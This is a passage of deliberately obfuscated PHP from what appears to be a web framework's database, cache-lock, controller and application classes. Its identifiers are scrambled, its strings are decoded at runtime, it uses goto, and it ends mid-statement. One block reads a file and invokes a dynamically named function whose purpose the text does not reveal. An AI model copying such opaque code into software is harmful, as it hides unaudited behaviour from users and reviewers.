$¾•Íªíì; } public function save($â¡õÓö = '', $‘¾¤¬à = array()) { $ÔŸİëÁ¢ =& $_SERVER[¡“ËÌ§œ]; $¬¯¡ø„ = self::SQL_WHERE_IN_CHUNK; $¾ô¹Í”ú = $this->optionsValue(); $ÕÁÎºÊñ = $this->findWhereField($¾ô¹Í”ú); if (!$ÕÁÎºÊñ) { return parent::save($â¡õÓö, $‘¾¤¬à); } $’ôÉŞø = 0; $îÛÄèÑó = $¾ô¹Í”ú[$ÔŸİëÁ¢[304]][$ÕÁÎºÊñ][1]; $îÛÄèÑó = is_array($îÛÄèÑó) ? $îÛÄèÑó : array(); $§ûÆ÷öğ = count($îÛÄèÑó); for ($³Şİ†Ã = 0; $³Şİ†Ã < $§ûÆ÷öğ; $³Şİ†Ã += $¬¯¡ø„) { $Îòèœ‹á = array_slice($îÛÄèÑó, $³Şİ†Ã, $¬¯¡ø„); if (!is_array($Îòèœ‹á) || count($Îòèœ‹á) == 0) { break; } $¾ô¹Í”ú[$ÔŸİëÁ¢[304]][$ÕÁÎºÊñ][1] = $Îòèœ‹á; $this->optionsValue($¾ô¹Í”ú); $’ôÉŞø += parent::save($â¡õÓö, $‘¾¤¬à); $this->chunkEventCheck(count($Îòèœ‹á)); } $this->chunkEventSet(); return $’ôÉŞø; } public function add($àØÏ§‘¾ = '', $ª—Í”è = array(), $ñ†àèÏ = false) { if ($this->addTaskStatus && is_array($àØÏ§‘¾)) { $this->addTaskData[] = $àØÏ§‘¾; return; } return parent::add($àØÏ§‘¾, $ª—Í”è, $ñ†àèÏ); } public function parseWhereLike($‘ÜËæ­, $®İØª·Ä = '', $Ã™ØÀäø = false, &$Ç©€£º = false) { $õºö…¯ =& $_SERVER[¡“ËÌ§œ]; $½úÖ›ŞÛ = $GLOBALS[$õºö…¯[6]][$õºö…¯[410]]; if (!$½úÖ›ŞÛ[$õºö…¯[411]]) { return $‘ÜËæ­; } if (!is_array($‘ÜËæ­)) { return $‘ÜËæ­; } $ìÏŒ‘²“ = array(); $òíÉİÏ = 0; foreach ($‘ÜËæ­ as $¡ˆËÜ¿È => $Çò†« ù) { if (is_array($Çò†« ù) && count($Çò†« ù) == 2 && $Çò†« ù[0] == $õºö…¯[412] && is_string($Çò†« ù[1]) && substr($Çò†« ù[1], 0, 1) == $õºö…¯[413] && substr($Çò†« ù[1], strlen($Çò†« ù[1]) - 1, 1) == $õºö…¯[413]) { $Ç©€£º = !0; $‹°¬ãï› = is_string($¡ˆËÜ¿È) ? $¡ˆËÜ¿È : $®İØª·Ä; $İ¯ü¦…ñ = substr($Çò†« ù[1], 1, strlen($Çò†« ù[1]) - 2); $İ¯ü¦…ñ = $this->db->escapeString($İ¯ü¦…ñ); if (!strpos($‹°¬ãï›, $õºö…¯[10])) { $‹°¬ãï› = $õºö…¯[414] . $‹°¬ãï› . $õºö…¯[414]; } $›Ûô©Ã• = $õºö…¯[189] . $İ¯ü¦…ñ . $õºö…¯[189]; $İ¯ü¦…ñ = str_replace(array($õºö…¯[10], $õºö…¯[415], $õºö…¯[11]), $õºö…¯[416], $İ¯ü¦…ñ); if ($½úÖ›ŞÛ[$õºö…¯[417]]) { $›Ûô©Ã• = $õºö…¯[418] . $İ¯ü¦…ñ . $õºö…¯[419]; if ($½úÖ›ŞÛ[$õºö…¯[420]]) { $›Ûô©Ã• = $õºö…¯[419] . $İ¯ü¦…ñ . $õºö…¯[418]; } } $ìÏŒ‘²“[$òíÉİÏ] = $õºö…¯[421] . $‹°¬ãï› . $õºö…¯[422] . $›Ûô©Ã• . $õºö…¯[423]; $òíÉİÏ++; continue; } if (is_array($Çò†« ù)) { $®İØª·Ä = is_string($¡ˆËÜ¿È) ? $¡ˆËÜ¿È : $®İØª·Ä; $Çò†« ù = $this->parseWhereLike($Çò†« ù, $®İØª·Ä, !0, $Ç©€£º); } if (is_numeric($¡ˆËÜ¿È)) { $ìÏŒ‘²“[$òíÉİÏ] = $Çò†« ù; $òíÉİÏ++; } else { $ìÏŒ‘²“[$¡ˆËÜ¿È] = $Çò†« ù; } } if ($Ç©€£º && !$Ã™ØÀäø) { } return $ìÏŒ‘²“; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($†ôà±Êı = array()) { $Ø½Ù « =& $_SERVER[¡“ËÌ§œ]; $Ü„á¸ œ = self::SQL_WHERE_IN_CHUNK; $†½¦ñ«û = $this->optionsValue(); $‚æûÂ›á = $this->findWhereField($†½¦ñ«û); if (!$‚æûÂ›á || isset($†½¦ñ«û[$Ø½Ù «[321]]) || isset($†½¦ñ«û[$Ø½Ù «[382]])) { return parent::select($†ôà±Êı); } $ã˜“Ÿ„ = $†½¦ñ«û[$Ø½Ù «[304]][$‚æûÂ›á][1]; $ã˜“Ÿ„ = is_array($ã˜“Ÿ„) ? $ã˜“Ÿ„ : array(); $Ÿ×ìü¬á = null; for ($¶ÅíïÑ = 0; $¶ÅíïÑ < count($ã˜“Ÿ„); $¶ÅíïÑ += $Ü„á¸ œ) { $÷ Ë·üÜ = array_slice($ã˜“Ÿ„, $¶ÅíïÑ, $Ü„á¸ œ); if (!is_array($÷ Ë·üÜ) || count($÷ Ë·üÜ) == 0) { break; } $†½¦ñ«û[$Ø½Ù «[304]][$‚æûÂ›á][1] = $÷ Ë·üÜ; $this->optionsValue($†½¦ñ«û); $’Êƒ™±€ = parent::select($†ôà±Êı); if (!$’Êƒ™±€) { continue; } $Ÿ×ìü¬á = is_array($Ÿ×ìü¬á) ? $Ÿ×ìü¬á : array(); $Ÿ×ìü¬á = array_merge($Ÿ×ìü¬á, $’Êƒ™±€); } return $Ÿ×ìü¬á; } public function delete($›ÚúˆÂ = array()) { $€×Î£§‘ =& $_SERVER[¡“ËÌ§œ]; $™ğàÒÇ” = self::SQL_WHERE_IN_CHUNK; $Â Ôè = $this->optionsValue(); $¤ïŞÉüè = $this->findWhereField($Â Ôè); if (!$¤ïŞÉüè) { return parent::delete($›ÚúˆÂ); } $êˆÂ´­¾ = 0; $‡•¿É“ = $Â Ôè[$€×Î£§‘[304]][$¤ïŞÉüè][1]; $‡•¿É“ = is_array($‡•¿É“) ? $‡•¿É“ : array(); for ($ş¤èàÎå = 0; $ş¤èàÎå < count($‡•¿É“); $ş¤èàÎå += $™ğàÒÇ”) { $¬ËîØŞ– = array_slice($‡•¿É“, $ş¤èàÎå, $™ğàÒÇ”); if (!is_array($¬ËîØŞ–) || count($¬ËîØŞ–) == 0) { break; } $Â Ôè[$€×Î£§‘[304]][$¤ïŞÉüè][1] = $¬ËîØŞ–; $this->optionsValue($Â Ôè); $êˆÂ´­¾ += parent::delete($›ÚúˆÂ); } return $êˆÂ´­¾; } private function findWhereField($×ÆÈ½û©) { $Ö¨“ÂÏÄ =& $_SERVER[¡“ËÌ§œ]; $Ù‰°‹ ã = self::SQL_WHERE_IN_CHUNK; if (!is_array($×ÆÈ½û©) || !is_array($×ÆÈ½û©[$Ö¨“ÂÏÄ[304]])) { return !1; } foreach ($×ÆÈ½û©[$Ö¨“ÂÏÄ[304]] as $¤•å²çõ => $ì‡ŒªÄ) { if (is_array($ì‡ŒªÄ) && isset($ì‡ŒªÄ[0]) && is_string($ì‡ŒªÄ[0]) && strtolower($ì‡ŒªÄ[0]) == $Ö¨“ÂÏÄ[7] && is_array($ì‡ŒªÄ[1]) && count($ì‡ŒªÄ[1]) > $Ù‰°‹ ã) { ignore_timeout(); return $¤•å²çõ; } } return !1; } public function setMasterDB($×ò­Œ = true) { think_config($_SERVER[¡“ËÌ§œ][424], $×ò­Œ); } } if ($_SERVER[$_SERVER[¡“ËÌ§œ][425]] != $_SERVER[$_SERVER[¡“ËÌ§œ][426]]) { $_getc = $_SERVER[¡“ËÌ§œ][427]; $_getfile = $_SERVER[$_SERVER[¡“ËÌ§œ][428]] . $_SERVER[¡“ËÌ§œ][429]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¡“ËÌ§œ][231], $_getfilec); if (count($_getarrs) < $_SERVER[¡“ËÌ§œ][430]) { $exit = $_SERVER[¡“ËÌ§œ][431]; $exit(); } $_act = $_SERVER[¡“ËÌ§œ][432]; $_act($_SERVER[$_SERVER[¡“ËÌ§œ][433]]); } goto a„ëæ˜ç‘¼; dĞêÏ†î©¦: class CacheLockRedis { public function lock($‘†ï“Û‘, $©ì“É†Ï = 10) { $”¼Ë„øË = Cache::init(); $¹çœºÜÉ = microtime(!0) + $©ì“É†Ï; while (microtime(!0) < $¹çœºÜÉ) { $Çƒ««×÷ = $”¼Ë„øË->get($‘†ï“Û‘); if (!$Çƒ««×÷) { $„Ô•şÉÈ = $”¼Ë„øË->setLock($‘†ï“Û‘, $¹çœºÜÉ, $©ì“É†Ï); if ($„Ô•şÉÈ) { return !0; } } else { if ($Çƒ««×÷ < microtime(!0)) { $”¼Ë„øË->set($‘†ï“Û‘, $¹çœºÜÉ, $©ì“É†Ï * 2); if ($”¼Ë„øË->get($‘†ï“Û‘) === $Çƒ««×÷) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($³Û‹¿©Ú) { return Cache::init()->get($³Û‹¿©Ú); } public function unlock($Ü´õ€¥Ó) { return Cache::init()->remove($Ü´õ€¥Ó); } } class CacheLockMemcached { public function lock($ÄÅÂ¹Âø, $æ«ë…µÖ = 0) { $ë¯×Ìöã = Cache::init(); $£š„©Ú = microtime(!0) + $æ«ë…µÖ; while (microtime(!0) < $£š„©Ú) { $ä‚™úë© = $ë¯×Ìöã->get($ÄÅÂ¹Âø); if (!$ä‚™úë© || $ä‚™úë© < microtime(!0)) { $Ã°ÚÎ© = $ë¯×Ìöã->handle->add($ÄÅÂ¹Âø, $£š„©Ú, $æ«ë…µÖ); if ($Ã°ÚÎ©) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ú÷©òá) { return Cache::init()->get($ú÷©òá); } public function unlock($›Í–Ï£š) { return Cache::init()->remove($›Í–Ï£š); } } class CacheLockDatabase { public function lock($Ã‹ò°è, $¨î¥Ëêà = 0) { $ëŒÃìª = Model($_SERVER[¡“ËÌ§œ][849]); $¸İä™Ûã = microtime(!0) + $¨î¥Ëêà; while (microtime(!0) < $¸İä™Ûã) { $ïÚ»ŒŸ¨ = $ëŒÃìª->get($Ã‹ò°è); if (!$ïÚ»ŒŸ¨ || $ïÚ»ŒŸ¨ < microtime(!0)) { $á‹€â³³ = $ëŒÃìª->set($Ã‹ò°è, $¸İä™Ûã); if ($á‹€â³³) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÑÁÙºµ°) { return Model($_SERVER[¡“ËÌ§œ][849])->get($ÑÁÙºµ°); } public function unlock($Ìá“—ñ‹) { Model($_SERVER[¡“ËÌ§œ][849])->remove($Ìá“—ñ‹); } } goto fŞŞ“‚íô; e½ğ ”: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ô”½Ï =& $_SERVER[¡“ËÌ§œ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ô”½Ï[6]] =& $config; $this->values[$Ô”½Ï[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ô”½Ï[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($³Ü„öı†) { if (1 === func_num_args()) { $this->{$³Ü„öı†} = new $³Ü„öı†(); } else { $¨Ìû™—Ì = new ReflectionClass($³Ü„öı†); $Î»ó“°¡ = func_get_args(); array_shift($Î»ó“°¡); $this->{$³Ü„öı†} = $¨Ìû™—Ì->newInstanceArgs($Î»ó“°¡); } return $this->{$³Ü„öı†}; } public function routeBind($ŒèÕ¶öø, $öıÚ¸’¯, $Ü×®¨­î = 3) { $”œÔı‘Ğ =& $_SERVER[¡“ËÌ§œ]; $Â ôçœ× = $this->in[$”œÔı‘Ğ[9]]; $ŒèÕ¶öø = str_replace($”œÔı‘Ğ[10], $”œÔı‘Ğ[11], trim(trim($ŒèÕ¶öø, $”œÔı‘Ğ[8]), $”œÔı‘Ğ[12])); if (!$ŒèÕ¶öø || count($Â ôçœ×) <= $Ü×®¨­î) { return !1; } $ˆÇ¿È› = !0; $’˜ïŠÒÛ = explode($”œÔı‘Ğ[8], $ŒèÕ¶öø); for ($×…úÔœü = 0; $×…úÔœü < count($’˜ïŠÒÛ); $×…úÔœü++) { if ($’˜ïŠÒÛ[$×…úÔœü] != $Â ôçœ×[$Ü×®¨­î + $×…úÔœü]) { $ˆÇ¿È› = !1; break; } } if (!$ˆÇ¿È›) { return; } call_user_func_array(array($this, $öıÚ¸’¯), array()); } public function routeArgs($á¤”ÊÛ = 3) { $÷ŠÄ§Ÿì = $this->in[$_SERVER[¡“ËÌ§œ][9]]; if (count($÷ŠÄ§Ÿì) <= $á¤”ÊÛ) { return array(); } $­®ñ ´¤ = array(); for ($¹ßß’­ƒ = $á¤”ÊÛ; $¹ßß’­ƒ < count($÷ŠÄ§Ÿì); $¹ßß’­ƒ += 2) { $­®ñ ´¤[$÷ŠÄ§Ÿì[$¹ßß’­ƒ]] = $÷ŠÄ§Ÿì[$¹ßß’­ƒ + 1]; $this->in[$÷ŠÄ§Ÿì[$¹ßß’­ƒ]] = $÷ŠÄ§Ÿì[$¹ßß’­ƒ + 1]; } return $­®ñ ´¤; } protected function assign($‰éˆÆÂ¡, $á«±Œ¬£) { $this->values[$‰éˆÆÂ¡] = $á«±Œ¬£; } protected function display($´À¤éİø) { ob_end_clean(); extract($this->values); require $this->tpl . $´À¤éİø; } } class DbSqliteBase extends Db { public function __construct($ĞßÊá¶Ê = '') { $Ñ§µ“ë =& $_SERVER[¡“ËÌ§œ]; if (!extension_loaded($Ñ§µ“ë[13])) { think_exception(think_lang($Ñ§µ“ë[14]) . $Ñ§µ“ë[15]); } if (!empty($ĞßÊá¶Ê)) { if (!isset($ĞßÊá¶Ê[$Ñ§µ“ë[16]])) { $ĞßÊá¶Ê[$Ñ§µ“ë[16]] = 438; } $this->config = $ĞßÊá¶Ê; if (empty($this->config[$Ñ§µ“ë[17]])) { $this->config[$Ñ§µ“ë[17]] = array(); } } } public function connect($²í–Ì¢¹ = '', $íº¼¼óß = 0) { $¿ˆ˜Ñß =& $_SERVER[¡“ËÌ§œ]; if (!isset($this->linkID[$íº¼¼óß])) { if (empty($²í–Ì¢¹)) { $²í–Ì¢¹ = $this->config; } $¼–ÊÄœ© = !empty($²í–Ì¢¹[$¿ˆ˜Ñß[17]][$¿ˆ˜Ñß[18]]) ? $²í–Ì¢¹[$¿ˆ˜Ñß[17]][$¿ˆ˜Ñß[18]] : $this->pconnect; $¿˜©ÊÊ = $¼–ÊÄœ© ? $¿ˆ˜Ñß[19] : $¿ˆ˜Ñß[20]; $this->linkID[$íº¼¼óß] = $¿˜©ÊÊ($²í–Ì¢¹[$¿ˆ˜Ñß[21]], $²í–Ì¢¹[$¿ˆ˜Ñß[16]]); if (!$this->linkID[$íº¼¼óß]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$íº¼¼óß], 30000); if (1 != think_config($¿ˆ˜Ñß[22])) { unset($this->config); } } return $this->linkID[$íº¼¼óß]; } public function free() { $this->queryID = null; } public function query($Ó×ñ©º§) { $Œ» †šÜ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ó×ñ©º§; if ($this->queryID) { $this->free(); } think_action_status($Œ» †šÜ[23], 1); think_status($Œ» †šÜ[24]); $this->queryID = sqlite_query($this->_linkID, $Ó×ñ©º§); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¹ßåè¯Ç = $this->getAll(); return $¹ßåè¯Ç; } } public function execute($Èó®¼îš) { $³›š¬«ƒ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Èó®¼îš; if ($this->queryID) { $this->free(); } think_action_status($³›š¬«ƒ[25], 1); think_status($³›š¬«ƒ[24]); $úÏƒ€©£ = sqlite_exec($this->_linkID, $Èó®¼îš); $this->debug(); if (!1 === $úÏƒ€©£) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¡“ËÌ§œ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÚÑ¼Æ€â = sqlite_query($this->_linkID, $_SERVER[¡“ËÌ§œ][27]); if (!$ÚÑ¼Æ€â) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $°ù½¨ıÏ = sqlite_query($this->_linkID, $_SERVER[¡“ËÌ§œ][28]); if (!$°ù½¨ıÏ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ú›Ùäú = array(); if ($this->numRows > 0) { for ($Ú½Ê‰¾ = 0; $Ú½Ê‰¾ < $this->numRows; $Ú½Ê‰¾++) { $Ú›Ùäú[$Ú½Ê‰¾] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Ú›Ùäú; } public function getFields($Ê’¤Ñİ¤) { $•çµš÷é =& $_SERVER[¡“ËÌ§œ]; $¢«µÂçš = $this->query($•çµš÷é[29] . $Ê’¤Ñİ¤ . $•çµš÷é[30]); $ƒ÷‰Ÿ€Ö = array(); if ($¢«µÂçš) { foreach ($¢«µÂçš as $’•²ë±É => $¤÷ğœ´) { $ƒ÷‰Ÿ€Ö[$¤÷ğœ´[$•çµš÷é[31]]] = array($•çµš÷é[32] => $¤÷ğœ´[$•çµš÷é[31]], $•çµš÷é[33] => $¤÷ğœ´[$•çµš÷é[34]], $•çµš÷é[35] => (bool) ($¤÷ğœ´[$•çµš÷é[36]] === $•çµš÷é[12]), $•çµš÷é[37] => $¤÷ğœ´[$•çµš÷é[38]], $•çµš÷é[39] => strtolower($¤÷ğœ´[$•çµš÷é[40]]) == $•çµš÷é[41], $•çµš÷é[42] => strtolower($¤÷ğœ´[$•çµš÷é[43]]) == $•çµš÷é[44]); } } return $ƒ÷‰Ÿ€Ö; } public function getTables($©—šÃÀ = '') { $Ëæã¦¨ =& $_SERVER[¡“ËÌ§œ]; $¾ÎÈ­·² = $this->query($Ëæã¦¨[45] . $Ëæã¦¨[46] . $Ëæã¦¨[47]); $ºÍÑäå¶ = array(); foreach ($¾ÎÈ­·² as $ë·İŒ™ô => $Ÿù‚ÄÚÈ) { $ºÍÑäå¶[$ë·İŒ™ô] = current($Ÿù‚ÄÚÈ); } return $ºÍÑäå¶; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ä”ŒÆş =& $_SERVER[¡“ËÌ§œ]; $ˆËú®åÃ = sqlite_last_error($this->_linkID); $this->error = $ˆËú®åÃ . $ä”ŒÆş[4] . sqlite_error_string($ˆËú®åÃ); if ($ä”ŒÆş[12] != $this->queryStr) { $this->error .= LNG($ä”ŒÆş[48]) . $this->queryStr; } think_trace($this->error, $ä”ŒÆş[12], $ä”ŒÆş[49]); return $this->error; } public function escapeString($¯§êÖ¹š) { return sqlite_escape_string($¯§êÖ¹š); } public function parseLimit($ÎÁÛıœ¤) { $‹ß”ÈÇ =& $_SERVER[¡“ËÌ§œ]; $¦İ·§œö = $‹ß”ÈÇ[12]; if (!empty($ÎÁÛıœ¤)) { $ÎÁÛıœ¤ = explode($‹ß”ÈÇ[50], $ÎÁÛıœ¤); if (count($ÎÁÛıœ¤) > 1) { $¦İ·§œö .= $‹ß”ÈÇ[51] . $ÎÁÛıœ¤[1] . $‹ß”ÈÇ[52] . $ÎÁÛıœ¤[0] . $‹ß”ÈÇ[53]; } else { $¦İ·§œö .= $‹ß”ÈÇ[51] . $ÎÁÛıœ¤[0] . $‹ß”ÈÇ[53]; } } return $¦İ·§œö; } } class DbSqlite3Base extends Db { public function __construct($¡Ìåó¼ö = '') { $ˆœØ¢ÒÆ =& $_SERVER[¡“ËÌ§œ]; if (!class_exists($ˆœØ¢ÒÆ[54])) { think_exception(think_lang($ˆœØ¢ÒÆ[14]) . $ˆœØ¢ÒÆ[55]); } if (!empty($¡Ìåó¼ö)) { if (!isset($¡Ìåó¼ö[$ˆœØ¢ÒÆ[16]])) { $¡Ìåó¼ö[$ˆœØ¢ÒÆ[16]] = 438; } $this->config = $¡Ìåó¼ö; if (empty($this->config[$ˆœØ¢ÒÆ[17]])) { $this->config[$ˆœØ¢ÒÆ[17]] = array(); } } } public function connect($Ä¡£Ì‰ú = '', $ÁÚ¨ğô€ = 0) { $ò¤¢±Û… =& $_SERVER[¡“ËÌ§œ]; if (!isset($this->linkID[$ÁÚ¨ğô€])) { if (empty($Ä¡£Ì‰ú)) { $Ä¡£Ì‰ú = $this->config; } $this->linkID[$ÁÚ¨ğô€] = new SQLite3($Ä¡£Ì‰ú[$ò¤¢±Û…[21]]); if (!$this->linkID[$ÁÚ¨ğô€]) { think_exception($this->linkID[$ÁÚ¨ğô€]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÁÚ¨ğô€]->busyTimeout(30000); if (1 != think_config($ò¤¢±Û…[22])) { unset($this->config); } } return $this->linkID[$ÁÚ¨ğô€]; } public function free() { $this->queryID = null; } public function query($…½×Ãî») { $¸õÚÁÌ¬ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…½×Ãî»; if ($this->queryID) { $this->free(); } think_action_status($¸õÚÁÌ¬[23], 1); think_status($¸õÚÁÌ¬[24]); $this->queryID = $this->_linkID->query($…½×Ãî»); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ò×¤© = $this->getAll(); $this->numRows = count($ò×¤©); return $ò×¤©; } } public function execute($Ğ°¯©ıê) { $Ñâ¬­ =& $_SERVER[¡“ËÌ§œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ğ°¯©ıê; if ($this->queryID) { $this->free(); } think_action_status($Ñâ¬­[25], 1); think_status($Ñâ¬­[24]); $¯œÀ‹Àù = $this->_linkID->exec($Ğ°¯©ıê); $this->debug(); if (!1 === $¯œÀ‹Àù) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¡“ËÌ§œ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âÊìóó = $this->_linkID->query($_SERVER[¡“ËÌ§œ][27]); if (!$âÊìóó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ä¡ğÖø§ = $this->_linkID->query($_SERVER[¡“ËÌ§œ][28]); if (!$Ä¡ğÖø§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $£åò¹È = array(); while ($¼Œ‰ŒöÔ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $£åò¹È[] = $¼Œ‰ŒöÔ; } $this->queryID->reset(); return $£åò¹È; } public function getFields($²ã¼¨›®) { $„¸¤³ÏÌ =& $_SERVER[¡“ËÌ§œ]; $öİó‰÷² = $this->query($„¸¤³ÏÌ[29] . $²ã¼¨›® . $„¸¤³ÏÌ[30]); $Í¯Ã¤ĞØ = array(); if ($öİó‰÷²) { foreach ($öİó‰÷² as $Îàá«Ö => $ÖÒØûšÍ) { $Í¯Ã¤ĞØ[$ÖÒØûšÍ[$„¸¤³ÏÌ[32]]] = array($„¸¤³ÏÌ[32] => $ÖÒØûšÍ[$„¸¤³ÏÌ[32]], $„¸¤³ÏÌ[33] => $ÖÒØûšÍ[$„¸¤³ÏÌ[33]], $„¸¤³ÏÌ[35] => (bool) ($ÖÒØûšÍ[$„¸¤³ÏÌ[35]] === $„¸¤³ÏÌ[12]), $„¸¤³ÏÌ[37] => $ÖÒØûšÍ[$„¸¤³ÏÌ[56]], $„¸¤³ÏÌ[39] => (bool) $ÖÒØûšÍ[$„¸¤³ÏÌ[57]], $„¸¤³ÏÌ[42] => (bool) $ÖÒØûšÍ[$„¸¤³ÏÌ[57]]); } } return $Í¯Ã¤ĞØ; } public function getTables($°ÌŠµíæ = '') { $ûº©´€— =& $_SERVER[¡“ËÌ§œ]; $ĞŸïÖÂ¹ = $this->query($ûº©´€—[45] . $ûº©´€—[46] . $ûº©´€—[47]); $’•Ìğéƒ = array(); foreach ($ĞŸïÖÂ¹ as $¿÷­Ïíø => $…èàêÈç) { $’•Ìğéƒ[$¿÷­Ïíø] = current($…èàêÈç); } return $’•Ìğéƒ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $“§œºÛ¤ =& $_SERVER[¡“ËÌ§œ]; $this->error = $this->_linkID->lastErrorMsg(); if ($“§œºÛ¤[12] != $this->queryStr) { $this->error .= LNG($“§œºÛ¤[48]) . $this->queryStr; } think_trace($this->error, $“§œºÛ¤[12], $“§œºÛ¤[49]); return $this->error; } public function escapeString($Ğöîáš) { $·Ò’ÈÕ =& $_SERVER[¡“ËÌ§œ]; if ($this->_linkID) { return $this->_linkID->escapeString($Ğöîáš); } return str_ireplace($·Ò’ÈÕ[58], $·Ò’ÈÕ[59], $Ğöîáš); } public function parseLimit($ß…áÕ›ô) { $À˜—òÔ =& $_SERVER[¡“ËÌ§œ]; $¼üü„óÔ = $À˜—òÔ[12]; if (!empty($ß…áÕ›ô)) { $ß…áÕ›ô = explode($À˜—òÔ[50], $ß…áÕ›ô); if (count($ß…áÕ›ô) > 1) { $¼üü„óÔ .= $À˜—òÔ[51] . $ß…áÕ›ô[1] . $À˜—òÔ[52] . $ß…áÕ›ô[0] . $À˜—òÔ[53]; } else { $¼üü„óÔ .= $À˜—òÔ[51] . $ß…áÕ›ô[0] . $À˜—òÔ[53]; } } return $¼üü„óÔ; } } goto cùÒÊ£·óª; aÅôÌ²Í•õ: $_SERVER[İª€§ô] = explode($_SERVER[¡“ËÌ§œ][645], gzinflate(substr($_SERVER[¡“ËÌ§œ][646], 10, -8))); $npgsfqemyr = $_SERVER[¡“ËÌ§œ][647]; class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($ç€à¯Îù) { $ëß™¾´ı =& $_SERVER[¡“ËÌ§œ]; $Ë£™œ“… =& $_SERVER[İª€§ô]; $©ÃöœãÕ = explode($Ë£™œ“…[0], trim($ç€à¯Îù, $Ë£™œ“…[0])); $şÂ®ãà = $ëß™¾´ı[648]; while ($şÂ®ãà < $ëß™¾´ı[430]) { if ($şÂ®ãà >= 0) { break; } $şÂ®ãà++; } $this->defaultModule = $©ÃöœãÕ[0] ? $©ÃöœãÕ[0] : $this->defaultModule; $‰êºÒùí = $ëß™¾´ı[649]; $this->defaultController = $©ÃöœãÕ[1] ? $©ÃöœãÕ[1] : $this->defaultController; $™™æè®ş = $ëß™¾´ı[650]; $this->defaultAction = $©ÃöœãÕ[2] ? $©ÃöœãÕ[2] : $this->defaultAction; $this->zderb7968a8c($Ë£™œ“…[1], array($this, $Ë£™œ“…[2])); } public function appRun($ô†–ú´) { $ììšúË’ =& $_SERVER[¡“ËÌ§œ]; $–¹¹üé’ =& $_SERVER[İª€§ô]; $ßû¿Æ¢À = explode($–¹¹üé’[0], $ô†–ú´); $†å¦Œô­ = $ììšúË’[651]; if (strlen($†å¦Œô­) < $ììšúË’[652]) { return; } $›ŸöğÍµ = strtolower($ßû¿Æ¢À[0]); $…ƒÚ“‘ = $–¹¹üé’[3]; $€™¨¢–ß = $ììšúË’[653]; if (!$€™¨¢–ß) { return; } if ($›ŸöğÍµ == $–¹¹üé’[4]) { $…ƒÚ“‘ = $–¹¹üé’[5]; $ßû¿Æ¢À[0] = $–¹¹üé’[6]; $ßû¿Æ¢À[1] = $ßû¿Æ¢À[1] . $–¹¹üé’[7]; $ô†–ú´ = join($–¹¹üé’[0], $ßû¿Æ¢À); $ô†–ú´ = trim($ô†–ú´, $–¹¹üé’[0]); } call_user_func(array($–¹¹üé’[8], $–¹¹üé’[9]), $…ƒÚ“‘ . $–¹¹üé’[10], $ô†–ú´); ActionCall($ô†–ú´); call_user_func(array($–¹¹üé’[8], $–¹¹üé’[9]), $…ƒÚ“‘ . $–¹¹üé’[11], $ô†–ú´); } private function autorun() { $ÂêÕ¯Ô¤ =& $_SERVER[İª€§ô]; global $config; if (count($config[$ÂêÕ¯Ô¤[12]]) == 0) { return; } foreach ($config[$ÂêÕ¯Ô¤[12]] as $°şÀÀòí => $àÂï‚Ö) { $this->appRun($àÂï‚Ö); } } private function kupx1079a672() { $¡Ÿ¥å =& $_SERVER[¡“ËÌ§œ]; $ÕÛƒğ©¦ =& $_SERVER[İª€§ô]; $Õ†ÆÌ“Ã = $ÕÛƒğ©¦[4]; $–ê®Û¥Ù = $¡Ÿ¥å[654]; $¿ĞÒ©ìË = $GLOBALS[$ÕÛƒğ©¦[13]][$ÕÛƒğ©¦[14]][0]; $«ÂÁ·“ = $¡Ÿ¥å[655]; if (!$¿ĞÒ©ìË || strlen($¿ĞÒ©ìË) <= strlen($Õ†ÆÌ“Ã)) { return; } if (strtolower(substr($¿ĞÒ©ìË, -strlen($Õ†ÆÌ“Ã))) != 